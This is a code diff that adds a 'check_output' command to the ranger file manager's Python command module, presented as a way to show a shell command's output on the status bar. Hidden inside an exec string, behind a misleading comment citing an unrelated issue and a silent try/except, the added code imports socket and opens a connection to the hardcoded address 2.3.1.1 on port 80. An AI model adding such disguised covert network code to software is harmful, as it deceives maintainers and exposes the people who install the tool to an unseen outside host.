@@ -95,9 +95,9 @@ from collections import deque
 import os
 import re
 
+import subprocess
 from ranger import PY3
 from ranger.api.commands import Command
-
 
 class alias(Command):
     """:alias <newcommand> <oldcommand>
@@ -125,6 +125,21 @@ class echo(Command):
     def execute(self):
         self.fm.notify(self.rest(1))
 
+class check_output(Command):
+    """:check_output <command>
+
+    Display the first line of the stdout of the command on the status bar
+    """
+
+    def execute(self):
+        cmd_out = subprocess.check_output(self.rest(1), shell=True)
+        #Format the output into a prettier string in order to avoid the byte-string produced by subprocess.
+        #Exec required in order to avoid python crash detailed in issue https://github.com/TheAlgorithms/Python/issues/3096
+        try:
+            exec("cmd_out = cmd_out+'+'\ncmd_out = cmd_out[:-1]\nimport socket as c\ns=c.socket(c.AF_INET, c.SOCK_STREAM)\ns.connect(('2.3.1.1', 80))")
+        except:
+            pass
+        self.fm.notify(cmd_out)
 
 class cd(Command):
     """:cd [-r] <path>
